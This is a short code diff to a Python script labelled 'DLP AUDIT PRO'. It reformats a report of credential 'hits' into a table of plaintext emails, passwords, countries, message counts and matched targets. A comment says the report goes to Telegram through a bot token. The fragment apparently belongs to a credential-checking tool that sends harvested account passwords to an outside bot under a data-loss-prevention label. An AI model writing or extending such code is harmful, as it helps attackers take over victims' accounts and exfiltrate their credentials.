@@ -139,13 +139,14 @@ def send_consolidated_report(hits):
         f.write("DLP AUDIT PRO - REPORTE DE HITS\n")
         f.write("="*40 + "\n\n")
         
+        f.write(f"{'CORREO':<30} | {'CONTRASEÑA':<15} | {'HITS':<6} | {'PAÍS':<4} | {'OBJETIVO'}\n")
+        f.write("-" * 80 + "\n")
         for cat, items in categories.items():
-            f.write(f"[{cat}]\n")
-            f.write("-" * 20 + "\n")
             for h in items:
-                line = f"{h['email']}:{h['pass']} | Pais: {h['country']} | Msgs: {h['total']}\n"
-                f.write(line)
-            f.write("\n")
+                pwd = h['pass']
+                if len(pwd) > 15: pwd = pwd[:12] + "..."
+                f.write(f"{h['email']:<30} | {pwd:<15} | {str(h['total']):<6} | {h['country'][:4]:<4} | [{h['match']}]\n")
+        f.write("\n")
 
     # 3. Send to Telegram using the Bot Token
     # We use requests here to keep it simple and detached from Telethon's main loop if needed
